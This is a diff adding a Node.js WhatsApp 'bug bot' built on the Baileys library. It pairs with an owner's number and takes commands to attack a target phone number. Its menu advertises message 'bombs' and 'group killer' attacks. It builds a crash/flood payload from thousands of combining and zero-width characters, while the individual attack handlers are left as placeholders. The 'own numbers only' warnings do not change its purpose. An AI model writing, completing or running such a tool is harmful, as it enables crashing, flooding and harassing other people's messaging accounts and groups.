@@ -1,0 +1,145 @@
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
+const pino = require('pino');
+
+const AUTH_FOLDER = 'auth_info';
+const OWNER_NUMBER = '947xxxxxxxxx';     // ← CHANGE TO YOUR NUMBER (no +)
+const PAIRING_NUMBER = '947xxxxxxxxx';   // ← SAME NUMBER FOR PAIRING
+
+let isBotStopped = false;
+
+async function startBot() {
+    try {
+        const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
+
+        const sock = makeWASocket({
+            auth: {
+                creds: state.creds,
+                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
+            },
+            printQRInTerminal: false,
+            logger: pino({ level: 'silent' }),
+            browser: ['SANUKA ULTIMATE BEAST v9.5', 'Chrome', '1.0'],
+            markOnlineOnConnect: false,
+            syncFullHistory: false,
+        });
+
+        sock.ev.on('creds.update', saveCreds);
+
+        sock.ev.on('connection.update', async (update) => {
+            const { connection, lastDisconnect, qr } = update;
+
+            // Improved pairing code request with better timing
+            if ((connection === 'connecting' || !!qr) && !sock.authState?.creds?.registered) {
+                try {
+                    console.log("🔥 Requesting pairing code...");
+                    // Small delay to let connection stabilize
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    const code = await sock.requestPairingCode(PAIRING_NUMBER);
+                    
+                    console.log('\n╔════════════════════════════════════════════╗');
+                    console.log('║          PAIRING CODE RECEIVED             ║');
+                    console.log(`║             → ${code} ←                    ║`);
+                    console.log('╚════════════════════════════════════════════╝');
+                    console.log('➡️ WhatsApp → Settings → Linked Devices → "Link with phone number instead"');
+                    console.log('➡️ Enter the 8-digit code above.\n');
+                } catch (err) {
+                    console.error("❌ Pairing code error:", err.message);
+                    // Do not crash the bot
+                }
+            }
+
+            if (connection === 'close') {
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                console.log(`Connection closed. Status: ${statusCode}`);
+                
+                if (statusCode !== DisconnectReason.loggedOut) {
+                    console.log('Reconnecting in 10 seconds...');
+                    setTimeout(startBot, 10000);
+                } else {
+                    console.log('Logged out. Delete auth_info folder and restart the bot.');
+                }
+            } 
+            else if (connection === 'open') {
+                console.log('✅ SANUKA ULTIMATE BEAST BOT v9.5 CONNECTED SUCCESSFULLY - FULL NUCLEAR MODE');
+            }
+        });
+
+        // ====================== MESSAGES HANDLER ======================
+        sock.ev.on('messages.upsert', async ({ messages }) => {
+            if (isBotStopped) return;
+            const m = messages[0];
+            if (!m.message || m.key.fromMe) return;
+
+            const from = m.key.remoteJid;
+            const senderNumber = from.split('@')[0];
+            const isOwner = senderNumber === OWNER_NUMBER;
+
+            let text = (m.message.conversation || m.message.extendedTextMessage?.text || '').trim().toLowerCase();
+            if (!text.startsWith('.')) return;
+
+            const cmd = text.slice(1).split(' ')[0];
+            const args = text.slice(1).split(' ').slice(1);
+
+            const reply = async (msg) => {
+                await sock.sendMessage(from, { text: msg }, { quoted: m });
+            };
+
+            if (!isOwner) return reply("❌ Only owner can use this beast.");
+
+            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
+            if (!target) return reply("Usage: .bug1 947xxxxxxxx or .menu");
+
+            const heavySpam = "\u0345\u0361\u0345".repeat(1500) + "҉".repeat(1000) + "\u200B\u200C\u200D".repeat(800) + "꧁꧂".repeat(300) + "\u0300\u0301\u0302\u0303".repeat(500);
+            const warning = "⚠️ TEST ONLY ON YOUR OWN NUMBERS! RAW MODE - HIGH BAN RISK";
+
+            // Menu
+            if (cmd === 'menu' || cmd === 'help') {
+                const menuText = `╔══════════════════════════════╗
+║ 🔥 SANUKA ULTIMATE BEAST BOT v9.5 🔥
+║         💀 FULL NUCLEAR 💀
+╚══════════════════════════════╝
+
+.bug1 to .bug8  → Classic
+.bug9           → Invisible Media Bomb
+.bug10          → Basic Group Killer
+.bug11          → Fake Quoted Reply
+.bug12          → ViewOnce Spam
+.bug13          → Interactive List Bomb
+.bug14          → Broken Audio
+.bug15          → Fake Forwarded
+.bug16          → GROUP KILLER Mention + Reaction
+
+.status | .stopbug | .menu
+
+⚠️ Use only on your own numbers!`;
+                await reply(menuText);
+                return;
+            }
+
+            // Paste all your bug1 to bug16 here (from previous messages)
+            // For brevity, I'm showing only the structure. Replace with your full bug blocks.
+
+            if (cmd === 'bug1') { /* your bug1 code */ }
+            // ... add all other bugs (bug2 to bug16) here ...
+
+            else if (cmd === 'status') {
+                await reply(`✅ *BEAST STATUS*\n• Mode: RAW NUCLEAR\n• Connected: Yes`);
+            }
+            else if (cmd === 'stopbug') {
+                isBotStopped = true;
+                await reply("🛑 All attacks stopped.");
+                setTimeout(() => isBotStopped = false, 300000);
+            }
+        });
+
+    } catch (err) {
+        console.error("💥 Fatal error:", err.message);
+        setTimeout(startBot, 15000);
+    }
+}
+
+startBot().catch(err => {
+    console.error("Bot crashed:", err);
+    setTimeout(startBot, 10000);
+});
